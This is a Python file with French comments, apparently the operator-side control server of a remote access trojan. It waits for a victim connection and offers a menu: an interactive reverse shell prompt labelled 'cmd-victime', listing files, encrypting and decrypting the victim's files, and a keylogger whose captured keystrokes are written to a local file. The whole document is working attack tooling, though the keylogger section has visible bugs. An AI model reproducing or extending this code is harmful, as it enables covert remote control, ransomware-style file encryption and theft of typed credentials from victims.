import socket
from datetime import datetime

# Création d'une socket serveur
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Liaison de la socket à une adresse et un port
server_socket.bind(("10.74.0.35", 8080))
server_socket.listen()

# Acceptation d'une connexion client
client_connection, client_address = server_socket.accept()

print("Connexion reçue de la part de : " + client_address[0])

while True:
    # Affichage du menu d'actions
    print("Choisissez une action :")
    print("1. REVERSE SHELL")
    print("2. Lister les fichiers")
    print("3. Chiffrer les fichiers")
    print("4. Dechiffrer les fichiers")
    print("5. Activer Keylogger")

    # Sélection d'une action par l'utilisateur
    choice = input("Votre choix (1, 2, 3, 4, 5): ")

    if choice == '1':
        # Envoi de l'action au client
        client_connection.send('1'.encode('ISO-8859-1'))
        while True:
            # Saisie de commandes pour le shell distant
            command = input("cmd-victime> ")
            client_connection.send(command.encode('ISO-8859-1'))
            if command == 'exit':
                # Fermeture de la connexion si la commande est 'exit'
                client_connection.close()
                break
            print(client_connection.recv(4096).decode('ISO-8859-1'))

    if choice == '2':
        # Envoi de l'action au client
        client_connection.send('2'.encode('ISO-8859-1'))
        print(client_connection.recv(4096).decode('ISO-8859-1'))

    if choice == '3':
        # Envoi de l'action au client
        client_connection.send('3'.encode('ISO-8859-1'))
        print(client_connection.recv(4096).decode('ISO-8859-1'))
        print(client_connection.recv(4096).decode('ISO-8859-1'))

    if choice == '4':
        # Envoi de l'action au client
        client_connection.send('4'.encode('ISO-8859-1'))
        print(client_connection.recv(4096).decode('ISO-8859-1'))
        print(client_connection.recv(4096).decode('ISO-8859-1'))

    if choice == '5':
        # Mise en place d'un keylogger
        data = ''
        file = open('hookingValue.txt', 'a')
        date_time = str(datetime.today())

        def process_messages():
            while True:
                # Réception de messages du client
                data = client_connection.recv(1024)
                if data:
                    # Enregistrement des messages dans un fichier
                    file.write("\n" + date_time + data)
                    print("!!!" + data)
                    file.close()

        process_messages()
